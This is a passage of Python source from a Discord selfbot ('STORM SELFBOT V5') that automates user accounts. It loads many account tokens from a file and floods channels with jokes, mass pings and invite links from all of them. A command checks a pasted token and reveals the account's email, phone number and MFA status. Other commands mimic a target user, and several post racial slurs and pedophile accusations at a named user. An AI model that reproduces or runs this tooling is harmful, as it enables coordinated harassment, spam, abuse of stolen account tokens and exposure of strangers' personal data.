{subcommands_text}

{C}╰──────────────────────────────────────────────╯
{M}{B}Developer: {C}NotHerXenon{R}
```"""

    await ctx.send(help_ui, delete_after=60)


mimic_user = None  

@bot.command()
async def mimic(ctx, user: discord.Member):
    global mimic_user
    mimic_user = user 
    await ctx.send(f"```Now mimicking {user.display_name}'s messages.```")


@bot.command()
async def mimicoff(ctx):
    global mimic_user
    mimic_user = None 
    await ctx.send("```Stopped mimicking messages.```")
    
async def fetch_anime_gif(action):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.waifu.pics/sfw/{action}") as r:
            if r.status == 200:
                data = await r.json()
                return data['url']  
            else:
                return None
            
            
bot.command()
async def hypesquad(ctx, house: str):
    house_ids = {
        "bravery": 1,
        "brilliance": 2,
        "balance": 3
    }

    headers = {
        "Authorization": bot.http.token, 
        "Content-Type": "application/json"
    }

    if house.lower() == "off":
        url = "https://discord.com/api/v9/hypesquad/online"
        async with aiohttp.ClientSession() as session:
            async with session.delete(url, headers=headers) as response:
                if response.status == 204:
                    await ctx.send("```HypeSquad house removed.```")
                else:
                    error_message = await response.text()
                    await ctx.send(f"```Failed to remove HypeSquad house: {response.status} - {error_message}```")
        return

    house_id = house_ids.get(house.lower())
    if house_id is None:
        await ctx.send("```Invalid house. Choose from 'bravery', 'brilliance', 'balance', or 'off'.```")
        return

    payload = {"house_id": house_id}
    url = "https://discord.com/api/v9/hypesquad/online"

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status == 204:
                await ctx.send(f"```HypeSquad house changed to {house.capitalize()}.```")
            else:
                error_message = await response.text()
                await ctx.send(f"```Failed to change HypeSquad house: {response.status} - {error_message}```")

@bot.command(name="kiss")
async def kiss(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to kiss!```")
        return

    gif_url = await fetch_anime_gif("kiss")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} sends an anime kiss to {member.display_name}! 💋```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime kiss GIF right now, try again later!```")
@bot.command(name="slap")
async def slap(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to slap!```")
        return

    gif_url = await fetch_anime_gif("slap")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} slaps {member.display_name}! 👋```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime slap GIF right now, try again later!```")


@bot.command(name="hurt")
async def hurt(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to kill!```")
        return

    gif_url = await fetch_anime_gif("kill")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} kills {member.display_name}! ☠```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime kill GIF right now, try again later!```")

@bot.command(name="pat")
async def pat(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to pat!```")
        return

    gif_url = await fetch_anime_gif("pat")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} pats {member.display_name}! 🖐```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime pat GIF right now, try again later!```")

@bot.command(name="wave")
async def wave(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to wave at!```")
        return

    gif_url = await fetch_anime_gif("wave")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} waves at {member.display_name}! 👋```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime wave GIF right now, try again later!```")

@bot.command(name="hug")
async def hug(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to hug!```")
        return

    gif_url = await fetch_anime_gif("hug")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} hugs {member.display_name}! 🤗```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime hug GIF right now, try again later!```")

@bot.command(name="cuddle")
async def cuddle(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to cuddle!```")
        return

    gif_url = await fetch_anime_gif("cuddle")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} cuddles {member.display_name}! 🤗```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime cuddle GIF right now, try again later!```")

@bot.command(name="lick")
async def lick(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to lick!```")
        return

    gif_url = await fetch_anime_gif("lick")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} licks {member.display_name}! 😋```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime lick GIF right now, try again later!```")

@bot.command(name="bite")
async def bite(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to bite!```")
        return

    gif_url = await fetch_anime_gif("bite")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bites {member.display_name}! 🐍```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bite GIF right now, try again later!```")

@bot.command(name="bully")
async def bully(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to bully!```")
        return

    gif_url = await fetch_anime_gif("bully")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bullies {member.display_name}! 😠```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bully GIF right now, try again later!```")

@bot.command(name="poke")
async def poke(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to poke!```")
        return

    gif_url = await fetch_anime_gif("poke")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} pokes {member.display_name}! 👉👈```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime poke GIF right now, try again later!```")


@bot.command(name="dance")
async def dance(ctx):
    gif_url = await fetch_anime_gif("dance")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} dances! 💃```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime dance GIF right now, try again later!```")

@bot.command(name="cry")
async def cry(ctx):
    gif_url = await fetch_anime_gif("cry")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} is crying! 😢```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime cry GIF right now, try again later!```")

@bot.command(name="sleep")
async def sleep(ctx):
    gif_url = await fetch_anime_gif("sleep")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} is sleeping! 😴```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime sleep GIF right now, try again later!```")

@bot.command(name="blush")
async def blush(ctx):
    gif_url = await fetch_anime_gif("blush")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} just blushed.! 😊```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime blush GIF right now, try again later!```")

@bot.command(name="wink")
async def wink(ctx):
    gif_url = await fetch_anime_gif("wink")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} winks! 😉```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime wink GIF right now, try again later!```")

@bot.command(name="smile")
async def smile(ctx):
    gif_url = await fetch_anime_gif("smile")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} smiles! 😊```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime smile GIF right now, try again later!```")


@bot.command(name="highfive")
async def highfive(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to high-five!```")
        return

    gif_url = await fetch_anime_gif("highfive")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} high-fives {member.display_name}! 🙌```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime high-five GIF right now, try again later!```")

@bot.command(name="handhold")
async def handhold(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to hold hands with!```")
        return

    gif_url = await fetch_anime_gif("handhold")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} holds hands with {member.display_name}! 🤝```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime handhold GIF right now, try again later!```")

@bot.command(name="nom")
async def nom(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to nom!```")
        return

    gif_url = await fetch_anime_gif("nom")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} noms on {member.display_name}! 😋```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime nom GIF right now, try again later!```")

@bot.command(name="smug")
async def smug(ctx):
    gif_url = await fetch_anime_gif("smug")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} has a smug look! 😏```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime smug GIF right now, try again later!```")

@bot.command(name="bonk")
async def bonk(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to bonk!```")
        return

    gif_url = await fetch_anime_gif("bonk")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bonks {member.display_name}! 🤭```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bonk GIF right now, try again later!```")

@bot.command(name="yeet")
async def yeet(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to yeet!```")
        return

    gif_url = await fetch_anime_gif("yeet")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} yeets {member.display_name}! 💨```\n[STORM SELFBOT V5]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime yeet GIF right now, try again later!```")

#Start playing
@bot.command(alises=["game"])
async def playing(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {get_prefix}playing <message>')
        return
    game = discord.Game(name=message)
    await bot.change_presence(activity=game)

#Start listening
@bot.command(aliases=["listen"])
async def listening(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {get_prefix}listening <message>')
        return
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))

#Start wathcing
@bot.command(aliases=["watch"])
async def watching(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {get_prefix}watching <message>')
        return
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))

#Stop your current activity
@bot.command(aliases=["stopstreaming", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await bot.change_presence(activity=None, status=discord.Status.dnd)
    
    
# Global variables with '300' added
streaming_status_delay300 = {}  # Delay per token position
active_clients300 = {}  # Active clients per token position
streaming_status_lists300 = {}  # Status lists per token position

class MultiStreamClient300(discord.Client):
    def __init__(self, token, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token300 = token
        self.position300 = position
        self.running = True  # Control loop for rotation

    async def update_presence300(self, details):
        """Update the custom streaming presence."""
        activity = discord.Streaming(
            name=details,
            url='https://www.twitch.tv/yourchannel'  # Replace with your channel URL
        )
        await self.change_presence(activity=activity)

    async def rotate_statuses300(self):
        """Rotate through the streaming statuses for this token indefinitely."""
        global streaming_status_delay300, streaming_status_lists300
        while self.running:
            statuses = streaming_status_lists300.get(self.position300, [])
            delay = streaming_status_delay300.get(self.position300, 3)
            for status in statuses:
                if not self.running:
                    break
                await self.update_presence300(status)
                await asyncio.sleep(delay)

    async def on_ready(self):
        print(f'Logged in as {self.user} with token {self.token300[-4:]}')
        asyncio.create_task(self.rotate_statuses300())

    async def stop_rotation(self):
        """Stop the status rotation loop."""
        self.running = False
        await self.close()

async def start_client_with_rotation300(token, position, statuses):
    """Log in the specified token and start rotating statuses for it."""
    global streaming_status_lists300, active_clients300
    streaming_status_lists300[position] = statuses  # Set status list for this token

    client = MultiStreamClient300(token, position, intents=intents)
    active_clients300[position] = client
    await client.start(token, bot=False)  # Start client

@bot.command()
async def ss(ctx, position: int, *, statuses: str):
    """Set and start rotating the stream status for a specific token."""
    global active_clients300, streaming_status_lists300

    # Load tokens from a file
    tokens = read_tokens('tokens2.txt')

    # Check if position is valid (1-based index)
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Parse and set the statuses
    statuses_list = [status.strip() for status in statuses.split(',')]
    token = tokens[position - 1]  # Adjust for 1-based index

    # Stop any existing client for this token if already running
    if position in active_clients300:
        await active_clients300[position].stop_rotation()
        del active_clients300[position]

    # Start new client with the specified statuses
    await start_client_with_rotation300(token, position, statuses_list)
    await ctx.send(f"Started rotating streaming statuses for token {position}.")

@bot.command()
async def sse(ctx, position: int):
    """Stop rotating streaming statuses for a specific token."""
    global active_clients300

    # Check if client for this token position is active (1-based index)
    if position in active_clients300:
        await active_clients300[position].stop_rotation()
        del active_clients300[position]
        await ctx.send(f"Stopped rotating streaming statuses for token {position}.")
    else:
        await ctx.send(f"No active status rotation found for token {position}.")

@bot.command()
async def ssd(ctx, position: int, delay: int):
    """Change the delay between streaming status updates for a specific token."""
    global streaming_status_delay300

    if delay > 0:
        streaming_status_delay300[position] = delay  # Set delay for this token (1-based index)
        await ctx.send(f"Streaming status delay for token {position} changed to {delay} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")

@bot.command()
async def ssa(ctx, *, statuses: str):
    """Start rotating streaming statuses for all tokens."""
    global active_clients300

    # Load tokens from a file
    tokens = read_tokens('tokens2.txt')
    statuses_list = [status.strip() for status in statuses.split(',')]

    # Stop any existing clients
    for position, client in active_clients300.items():
        await client.stop_rotation()
    active_clients300.clear()

    # Start new clients with specified statuses
    for i, token in enumerate(tokens, start=1):  # 1-based index
        await start_client_with_rotation300(token, i, statuses_list)

    await ctx.send("Started rotating streaming statuses for all tokens.")

@bot.command()
async def ssae(ctx):
    """Stop rotating streaming statuses for all tokens."""
    global active_clients300

    # Stop all active clients
    for client in active_clients300.values():
        await client.stop_rotation()
    active_clients300.clear()

    await ctx.send("Stopped rotating streaming statuses for all tokens.")

@bot.command()
async def ssda(ctx, delay: int):
    """Change the delay between streaming status updates for all tokens."""
    global streaming_status_delay300

    if delay > 0:
        # Set delay for all token positions
        for position in active_clients300.keys():
            streaming_status_delay300[position] = delay
        await ctx.send(f"Streaming status delay for all tokens changed to {delay} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")


@bot.command(name='gcf')
async def gcf(ctx):
    """Enable the GC fill listener."""
    gcfill_cog.enabled = True
    gcfill_cog.start_auto_adder()
    await ctx.send("GC fill listener enabled.")

@bot.command(name='gcfe')
async def gcfe(ctx):
    """Disable the GC fill listener."""
    gcfill_cog.enabled = False
    gcfill_cog.stop_auto_adder()
    await ctx.send("GC fill listener disabled.")

@bot.command(name='uid')
async def add_uid(ctx, user_id: str):
    """Add a user ID to gcfill.txt."""
    try:
        with open('gcfill.txt', 'a') as file:
            file.write(f"\n{user_id}\n")
        await ctx.send(f"User ID {user_id} added to gcfill.txt.")
    except Exception as e:
        await ctx.send(f"An error occurred while adding the user ID: {e}")
        
        
@bot.command(name='rstatus')
async def rotate_status(ctx, *, statuses: str):
    global status_rotation_active, current_status, current_emoji
    await ctx.message.delete()
    
    status_list = [s.strip() for s in statuses.split(',')]
    
    if not status_list:
        await ctx.send("```Please separate statuses by commas.```", delete_after=3)
        return
    
    current_index = 0
    status_rotation_active = True
    
    async def update_status_emoji():
        json_data = {
            'custom_status': {
                'text': current_status,
                'emoji_name': current_emoji
            }
        }

        custom_emoji_match = re.match(r'<a?:(\w+):(\d+)>', current_emoji)
        if custom_emoji_match:
            name, emoji_id = custom_emoji_match.groups()
            json_data['custom_status']['emoji_name'] = name
            json_data['custom_status']['emoji_id'] = emoji_id
        else:
            json_data['custom_status']['emoji_name'] = current_emoji

        async with aiohttp.ClientSession() as session:
            try:
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={'Authorization': bot.http.token, 'Content-Type': 'application/json'},
                    json=json_data
                ) as resp:
                    await resp.read()
            finally:
                await session.close()

    await ctx.send(f"```Status rotation started```")
    
    try:
        while status_rotation_active:
            current_status = status_list[current_index]
            await update_status_emoji()
            await asyncio.sleep(8)
            current_index = (current_index + 1) % len(status_list)
                
    finally:
        current_status = ""
        await update_status_emoji()
        status_rotation_active = False

@bot.command(name='remoji')
async def rotate_emoji(ctx, *, emojis: str):
    global emoji_rotation_active, current_emoji, status_rotation_active
    await ctx.message.delete()
    
    emoji_list = [e.strip() for e in emojis.split(',')]
    
    if not emoji_list:
        await ctx.send("```Please separate emojis by commas.```", delete_after=3)
        return
    
    current_index = 0
    emoji_rotation_active = True
    
    async def update_status_emoji():
        json_data = {
            'custom_status': {
                'text': current_status,
                'emoji_name': current_emoji
            }
        }
        
        custom_emoji_match = re.match(r'<a?:(\w+):(\d+)>', current_emoji)
        if custom_emoji_match:
            name, emoji_id = custom_emoji_match.groups()
            json_data['custom_status']['emoji_name'] = name
            json_data['custom_status']['emoji_id'] = emoji_id
        else:
            json_data['custom_status']['emoji_name'] = current_emoji

        async with aiohttp.ClientSession() as session:
            try:
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={'Authorization': bot.http.token, 'Content-Type': 'application/json'},
                    json=json_data
                ) as resp:
                    await resp.read()
            finally:
                await session.close()

    await ctx.send(f"```Emoji rotation started```")
    
    try:
        while emoji_rotation_active:
            current_emoji = emoji_list[current_index]
            await update_status_emoji()
            await asyncio.sleep(8)
            current_index = (current_index + 1) % len(emoji_list)
                
    finally:
        current_emoji = ""
        await update_status_emoji()
        emoji_rotation_active = False

@bot.command(name='stopstatus')
async def stop_rotate_status(ctx):
    global status_rotation_active
    status_rotation_active = False
    await ctx.send("```Status rotation stopped.```", delete_after=3)

@bot.command(name='stopemoji')
async def stop_rotate_emoji(ctx):
    global emoji_rotation_active
    emoji_rotation_active = False
    await ctx.send("```Emoji rotation stopped.```", delete_after=3)
    
@bot.command(help="Check if a Discord user token is valid or get detailed info.\nUsage: ct <v|i> <token>")
async def ct(ctx, mode: str, token: str):
    await ctx.message.delete()
    
    headers = {
        'Authorization': token
    }

    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)

    if response.status_code == 200:
        if mode.lower() == "v":
            info = "**Token is valid.**"
        elif mode.lower() == "i":
            user_data = response.json()
            
            # Process user_data and format info
            info = (
                f"**Token is valid.**\n\n"
                f"**Username**: {user_data.get('username', 'N/A')}#{user_data.get('discriminator', 'N/A')}\n"
                f"**User ID**: {user_data.get('id', 'N/A')}\n"
                f"**Email**: {user_data.get('email', 'N/A')}\n"
                f"**Phone No.**: {user_data.get('phone', 'N/A')}\n"
                f"**Nitro**: {'Yes' if user_data.get('premium_type') else 'No'}\n"
                f"**Email Verified**: {'Yes' if user_data.get('verified') else 'No'}\n"
                f"**Phone Verified**: {'Yes' if user_data.get('phone') else 'No'}\n"
                f"**MFA**: {'Yes' if user_data.get('mfa_enabled') else 'No'}\n"
                f"**NSFW**: {'Yes' if user_data.get('nsfw_allowed') else 'No'}\n"
                f"**Creation**: {discord.utils.snowflake_time(int(user_data.get('id', 'N/A'))).strftime('%d %B %Y; %I:%M:%S %p')}\n"
                f"**Banner URL**: {user_data.get('banner', 'N/A')}\n"
                f"**Accent Color**: {user_data.get('accent_color', 'N/A')}\n"
                f"**Avatar URL**: https://cdn.discordapp.com/avatars/{user_data.get('id', 'N/A')}/{user_data.get('avatar', 'N/A')}.png\n"
            )
        else:
            info = "**Invalid mode. Please use 'validation' or 'info'.**"
    elif response.status_code == 401:
        info = "**Token is invalid.**"
    else:
        info = f"**An unexpected error occurred: {response.status_code}**"

    await ctx.send(info, delete_after=30)

@bot.command()
async def setstatus(ctx, status_type: str):
    await ctx.message.delete()
    status_type = status_type.lower()
    if status_type == 'online':
        await bot.change_presence(status=discord.Status.online)
        await ctx.send('Online.', delete_after=3)
    elif status_type == 'dnd':
        await bot.change_presence(status=discord.Status.dnd)
        await ctx.send('dnd', delete_after=3)        
    elif status_type == 'idle':
        await bot.change_presence(status=discord.Status.idle)
        await ctx.send('idle.', delete_after=3)
    elif status_type == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
        await ctx.send('invisible.', delete_after=3)
    else:
        await ctx.send('Invalid status type. Use `online` or `dnd` or `invisible` or `idle`.', delete_after=5)

@setstatus.error
async def status_error(ctx, error):
    await ctx.send(f'An error occurred: {error}', delete_after=3)
    
# Global variables
user_to_ping = {}
current_delay = {}
current_mode = {}
active_clients = {}


@bot.command()
async def diddy(ctx, user: discord.User):
    percentage = random.randint(10,1000)
    await ctx.send(f"{user.mention} is {percentage}% diddy\n stop oiling up kids diddy ahh ☠️")
    
    
@bot.command
async def smellychatpacker(ctx, user: discord.User):
    percentage =  random.randint(1, 200)
    await ctx.send (f"{user.mention}is {percentage}% smelly as fuck chatpacker\n go take a shower u fuckin loser")

@bot.command()
async def pedophile(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% pedophile fucking pedo\n fucking pedophile stop touching kids nigga is chiefjustice LOLO ☠️")


@bot.command()
async def GOAT(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% GOAT, nigga not a goat\n ur not on my level weak fuck ☠️")


@bot.command()
async def ceepeelover(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% ceepee, nigga ew a pedophile\n nigga idols are chiefjustice and mourn lolololo ☠️")


@bot.command()
async def nitro(ctx, user: discord.User):
    await ctx.send(f"{user.mention} https://media.discordapp.net/attachments/1153645269745926174/1194096579011956767/ezgif-1-c9599ca267.gif?ex=674bc199&is=674a7019&hm=9a1af4657b58be730316c368c9c2a206f8695f3d05a0c0e892a96399dccf42b4&=&width=292&height=198\n yes ur not getting nitro fuck ass nigga")    


@bot.command()
async def godly(ctx, user: discord.User):
    percentage = random.randint(1,150)
    await ctx.send(f"{user.mention} is {percentage}% godly\n nigga is not godly LOLOLO nigga is a fuckin lowtier")
    







def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

running_processes = {}

@bot.command()
async def gct(ctx, channel_id: int, position: int, name: str):
    # Start the gct.py script with the specified position and name
    process = subprocess.Popen(['python', 'gct.py', str(channel_id), str(position), name])

    # Store the process with the position as the key
    running_processes[position] = process

    await ctx.send(f'Started the channel renaming bot in channel ID {channel_id} for token position {position} with name: {name}')

@bot.command()
async def gcte(ctx, position: int):
    # Stop the renaming bot for the specific token at the given position
    if position in running_processes:
        process = running_processes[position]
        process.terminate()  # Terminate the process
        del running_processes[position]  # Remove the process from the dictionary
        await ctx.send(f'Stopped the channel renaming bot for token position {position}.')
    else:
        await ctx.send(f'No renaming bot is running for token position {position}.')

@bot.command()
async def gcta(ctx, channel_id: int, name: str):
    # Start the renaming process for all tokens
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Start a process for each token
    for position in range(1, len(tokens) + 1):
        process = subprocess.Popen(['python', 'gct.py', str(channel_id), str(position), name])
        running_processes[position] = process

    await ctx.send(f'Started the channel renaming bot for all tokens in channel ID {channel_id} with name: {name}')

@bot.command()
async def gctae(ctx):
    # Stop all renaming bots for all tokens
    if running_processes:
        for position, process in list(running_processes.items()):
            process.terminate()  # Terminate each process
            del running_processes[position]
        await ctx.send('Stopped all channel renaming bots for all tokens.')
    else:
        await ctx.send('No renaming bots are currently running.')



def load_jokes():
    with open("jokes.txt", "r") as f:
        return f.read().splitlines()

class MultiTokenClient(discord.Client):
    def __init__(self, token, delay, channel_id, user_to_ping=None, mode=1, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.delay = delay
        self.channel_id = channel_id
        self.user_to_ping = user_to_ping
        self.running = True
        self.mode = mode  # Store the mode

    async def on_ready(self):
        print(f'Logged in as {self.user}')
        channel = self.get_channel(self.channel_id)

        while self.running:
            joke = random.choice(load_jokes())  # Load a random joke
            message = self.format_message(joke)
            if message and channel:  # Ensure the channel is valid and message is not None
                try:
                    await channel.send(message)  # Send the joke
                except discord.Forbidden:
                    print(f"Message blocked: {message}")  # Log that the message was blocked
                except Exception as e:
                    print(f"An error occurred: {e}")  # Handle other potential errors
            await asyncio.sleep(self.delay)

    def format_message(self, joke):
        # Apply the selected mode to format the joke
        if self.mode == 1:
            return f" {joke} <@{self.user_to_ping}>" if self.user_to_ping else joke  # Normal
        elif self.mode == 2:
            return f" {' '.join(joke.split())} <@{self.user_to_ping}>" if self.user_to_ping else '\n'.join(joke.split())  # 1 new line between words
        elif self.mode == 3:
            return f"{'# ' + (joke * 20)} <@{self.user_to_ping}>" if self.user_to_ping else f"{'# ' + (joke * 20)}"  # Single joke as header multiplied by 20
        elif self.mode == 4:
            normal = joke
            new_lines = '\n'.join([f"{word}" for word in joke.split()])
            header = f"{'# ' + joke} <@{self.user_to_ping}>"
            return f"{normal}\n{new_lines}\n{header}"
        elif self.mode == 5:
            return f"<@{self.user_to_ping}> {'\n'.join([f'{word}' for word in joke.split()])}\n" * 100 if self.user_to_ping else '\n'.join([f'{word}' for word in joke.split()]) + "\n" * 100  # 100 new lines between words
        elif self.mode == 6:
            return f" {'# ' + joke} <@{self.user_to_ping}>" if self.user_to_ping else f"{'# ' + joke}"  # Header without multiplying
        elif self.mode == 7:
            self.delay = random.uniform(2, 4)  # Random delay between 2 and 4 seconds
            return f"<@{self.user_to_ping}> {joke}" if self.user_to_ping else joke  # Normal message format
        elif self.mode == 8:
            return None  # Do not return a message in mode 8
        elif self.mode == 9:
            return f"<@{self.user_to_ping}> {joke}\ndiscord.gg/corpses" if self.user_to_ping else f"{joke}\ndiscord.gg/corpsesodd"  # Appends full invite link
        elif self.mode == 10:
            return f"<@{self.user_to_ping}> {joke} /corpses" if self.user_to_ping else f"{joke} /corpses"  # Appends just the custom string (e.g., /odd)
        return joke  # Fallback to normal


@bot.command()
async def ap(ctx, channel_id: int, position: int, delay: float = 4):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].running = False
        await active_clients[token].close()

    client = MultiTokenClient(token, delay, channel_id)
    active_clients[token] = client  # Keep track of the active client
    await client.start(token, bot=False)  # Start the client
    await ctx.send(f'Started sending jokes in <#{channel_id}> every {delay} seconds using token at position {position}.')

@bot.command()
async def ape(ctx, position: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].running = False
        await active_clients[token].close()

    await ctx.send(f'Stopped sending jokes for token at position {position}.')

@bot.command()
async def app(ctx, position: int, user_id: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].user_to_ping = user_id  # Set the user to ping for this token
        await ctx.send(f'Token at position {position} will now ping <@{user_id}> with each joke.')
    else:
        await ctx.send("Token is not currently active.")

@bot.command()
async def apm(ctx, position: int, mode: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].mode = mode  # Update the mode for the active token
        await ctx.send(f'Token at position {position} mode changed to {mode}.')
    else:
        await ctx.send("Token is not currently active.")

@bot.command()
async def apa(ctx, channel_id: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    async def start_client(token):
        client = MultiTokenClient(token, 4, channel_id)  # Default delay set to 4 seconds
        active_clients[token] = client  # Keep track of the active client
        await client.start(token, bot=False)  # Start the client

    tasks = [start_client(token) for token in tokens]
    await asyncio.gather(*tasks)  # Start all tokens simultaneously

    await ctx.send(f'All tokens are now sending jokes in <#{channel_id}> every 4 seconds.')

@bot.command()
async def apae(ctx):
    global active_clients

    for token, client in active_clients.items():
        client.running = False  # Stop each client
        await client.close()  # Close the client connection

    active_clients.clear()  # Clear the active clients
    await ctx.send('Stopped all active tokens from sending jokes.')

@bot.command()
async def apd(ctx, position: int, delay: float):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].delay = delay  # Update the delay for the active token
        await ctx.send(f'Token at position {position} delay changed to {delay} seconds.')
    else:
        await ctx.send("Token is not currently active.")

@bot.command()
async def apma(ctx, mode: int):
    global active_clients

    for token, client in active_clients.items():
        client.mode = mode  # Update the mode for all active tokens


@bot.command()
async def appa(ctx, user_id: int):
    global active_clients

    for token, client in active_clients.items():
        client.user_to_ping = user_id  # Set the user to ping for all active tokens

@bot.command()
async def apda(ctx, delay: float):
    global active_clients

    for token, client in active_clients.items():
        client.delay = delay  # Update the delay for each active token



@bot.command()
